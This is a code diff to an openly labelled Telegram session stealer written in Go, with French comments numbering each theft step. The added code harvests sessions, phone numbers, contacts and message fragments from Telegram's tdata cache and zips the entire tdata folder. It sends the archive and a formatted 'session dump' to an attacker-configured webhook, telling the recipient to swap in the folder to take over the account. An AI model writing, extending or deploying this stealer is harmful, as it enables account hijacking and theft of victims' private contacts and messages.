@@ -25,6 +25,19 @@ type TelegramSession struct {
 	DataPath  string `json:"data_path"`
 }
 
+type TelegramContact struct {
+	Phone string `json:"phone"`
+	Name  string `json:"name"`
+	ID    int64  `json:"id"`
+}
+
+type TelegramMessage struct {
+	Sender   string `json:"sender"`
+	Receiver string `json:"receiver"`
+	Content  string `json:"content"`
+	Time     string `json:"time"`
+}
+
 func Run(config map[string]interface{}) {
 	webhook := config["webhook"].(string)
 	telegramConfig := config["telegram"].(map[string]string)
@@ -41,6 +54,7 @@ func Run(config map[string]interface{}) {
 
 	sendStatus(webhook, telegramConfig, "telegram", "📁 TData Found", "Telegram tdata folder located")
 
+	// 1. Vol des sessions
 	sessions := extractSessions(tdataPath)
 	if len(sessions) == 0 {
 		sendStatus(webhook, telegramConfig, "telegram", "⚠️ No Sessions Found", "No active Telegram sessions found")
@@ -48,19 +62,34 @@ func Run(config map[string]interface{}) {
 		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("✅ %d Sessions Found", len(sessions)), fmt.Sprintf("Found %d Telegram sessions", len(sessions)))
 	}
 
+	// 2. Vol des numéros de téléphone
 	phones := extractPhones(tdataPath)
 	if len(phones) > 0 {
 		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("📱 %d Phones Found", len(phones)), fmt.Sprintf("Found %d phone numbers", len(phones)))
 	}
 
-	zipPath := createTDataZip(tdataPath)
+	// 3. Vol des contacts
+	contacts := stealContacts(tdataPath)
+	if len(contacts) > 0 {
+		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("👥 %d Contacts Found", len(contacts)), fmt.Sprintf("Found %d Telegram contacts", len(contacts)))
+	}
+
+	// 4. Vol des messages récents
+	messages := stealRecentMessages(tdataPath)
+	if len(messages) > 0 {
+		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("💬 %d Messages Found", len(messages)), fmt.Sprintf("Found %d recent messages", len(messages)))
+	}
+
+	// 5. ZIP complet du dossier tdata
+	zipPath := createFullTDataZip(tdataPath)
 	if zipPath != "" {
-		sendStatus(webhook, telegramConfig, "telegram", "📦 TData Archived", "Telegram tdata folder compressed")
+		sendStatus(webhook, telegramConfig, "telegram", "📦 Full TData Archived", "Telegram tdata folder compressed")
 		sendFile(webhook, telegramConfig, zipPath)
 		os.Remove(zipPath)
 	}
 
-	sessionInfo := formatSessionInfo(sessions, phones)
+	// 6. Envoi des informations
+	sessionInfo := formatCompleteInfo(sessions, phones, contacts, messages)
 	sendMessage(webhook, telegramConfig, sessionInfo)
 
 	sendStatus(webhook, telegramConfig, "telegram", "✅ Telegram Stealer Complete", "Telegram session stealing finished")
@@ -123,8 +152,63 @@ func extractPhones(tdataPath string) []string {
 	return phones
 }
 
-func createTDataZip(tdataPath string) string {
-	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("telegram_tdata_%d.zip", time.Now().Unix()))
+func stealContacts(tdataPath string) []TelegramContact {
+	var contacts []TelegramContact
+	contactRegex := regexp.MustCompile(`(\+?\d{10,15})`)
+
+	// Les contacts sont souvent dans les fichiers .cache
+	cacheFiles, _ := filepath.Glob(filepath.Join(tdataPath, "*.cache"))
+	for _, cacheFile := range cacheFiles {
+		data, err := ioutil.ReadFile(cacheFile)
+		if err == nil {
+			matches := contactRegex.FindAllString(string(data), -1)
+			for _, match := range matches {
+				if !containsContact(contacts, match) {
+					contacts = append(contacts, TelegramContact{
+						Phone: match,
+						Name:  "Unknown",
+					})
+				}
+			}
+		}
+	}
+
+	return contacts
+}
+
+func stealRecentMessages(tdataPath string) []TelegramMessage {
+	var messages []TelegramMessage
+
+	// Les messages sont dans les fichiers de cache
+	cacheFiles, _ := filepath.Glob(filepath.Join(tdataPath, "*.cache"))
+	for _, cacheFile := range cacheFiles {
+		data, err := ioutil.ReadFile(cacheFile)
+		if err == nil {
+			// Rechercher des patterns de messages
+			// Format typique : "sender: message content"
+			msgRegex := regexp.MustCompile(`([a-zA-Z0-9_]+):\s*(.+?)($|\n)`)
+			matches := msgRegex.FindAllStringSubmatch(string(data), -1)
+			for _, match := range matches {
+				if len(match) >= 3 {
+					messages = append(messages, TelegramMessage{
+						Sender:   match[1],
+						Content:  strings.TrimSpace(match[2]),
+						Receiver: "Me",
+						Time:     time.Now().Format("15:04:05"),
+					})
+				}
+			}
+
+			// Format alternatif : messages chiffrés (si on peut les déchiffrer)
+			// Pour l'instant, on les récupère tels quels
+		}
+	}
+
+	return messages
+}
+
+func createFullTDataZip(tdataPath string) string {
+	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("telegram_full_%d.zip", time.Now().Unix()))
 
 	zipFile, err := os.Create(zipPath)
 	if err != nil {
@@ -140,10 +224,6 @@ func createTDataZip(tdataPath string) string {
 			return nil
 		}
 		if info.IsDir() {
-			return nil
-		}
-
-		if strings.HasSuffix(info.Name(), ".tmp") || strings.HasSuffix(info.Name(), ".lock") {
 			return nil
 		}
 
@@ -170,35 +250,66 @@ func createTDataZip(tdataPath string) string {
 	return zipPath
 }
 
-func formatSessionInfo(sessions []TelegramSession, phones []string) string {
+func formatCompleteInfo(sessions []TelegramSession, phones []string, contacts []TelegramContact, messages []TelegramMessage) string {
 	var output string
-	output += "📱 TELEGRAM SESSIONS\n"
-	output += "==================\n\n"
 
+	output += "📱 TELEGRAM COMPLETE SESSION DUMP\n"
+	output += "==================================\n\n"
+
+	// Sessions
+	output += "🔑 SESSIONS\n"
+	output += "-----------\n\n"
 	if len(sessions) == 0 {
-		output += "No Telegram sessions found.\n"
+		output += "No Telegram sessions found.\n\n"
 	} else {
 		for i, session := range sessions {
 			output += fmt.Sprintf("[Session %d]\n", i+1)
 			output += fmt.Sprintf("Path: %s\n", session.DataPath)
-			if len(phones) > i {
+			if len(phones) > i && i < len(phones) {
 				output += fmt.Sprintf("Phone: %s\n", phones[i])
 			}
 			output += "\n"
 		}
 	}
 
+	// Phones
+	output += "📱 PHONES\n"
+	output += "---------\n\n"
 	if len(phones) > 0 {
-		output += "📱 PHONES FOUND\n"
-		output += "===============\n\n"
 		for _, phone := range phones {
 			output += fmt.Sprintf("- %s\n", phone)
 		}
-		output += "\n"
+	} else {
+		output += "No phones found.\n"
 	}
+	output += "\n"
 
-	output += "📦 TData Folder\n"
-	output += "===============\n"
+	// Contacts
+	output += "👥 CONTACTS\n"
+	output += "-----------\n\n"
+	if len(contacts) > 0 {
+		for _, contact := range contacts {
+			output += fmt.Sprintf("- %s (%s)\n", contact.Name, contact.Phone)
+		}
+	} else {
+		output += "No contacts found.\n"
+	}
+	output += "\n"
+
+	// Recent Messages
+	output += "💬 RECENT MESSAGES\n"
+	output += "-----------------\n\n"
+	if len(messages) > 0 {
+		for _, msg := range messages {
+			output += fmt.Sprintf("[%s] %s -> %s: %s\n", msg.Time, msg.Sender, msg.Receiver, msg.Content)
+		}
+	} else {
+		output += "No recent messages found.\n"
+	}
+	output += "\n"
+
+	output += "📦 Full TData Folder\n"
+	output += "====================\n"
 	output += "The complete tdata folder is attached as a ZIP file.\n"
 	output += "To use: Replace your tdata folder with this one.\n"
 
@@ -298,6 +409,15 @@ func execCmd(cmd string) {}
 func contains(slice []string, item string) bool {
 	for _, s := range slice {
 		if s == item {
+			return true
+		}
+	}
+	return false
+}
+
+func containsContact(contacts []TelegramContact, phone string) bool {
+	for _, c := range contacts {
+		if c.Phone == phone {
 			return true
 		}
 	}
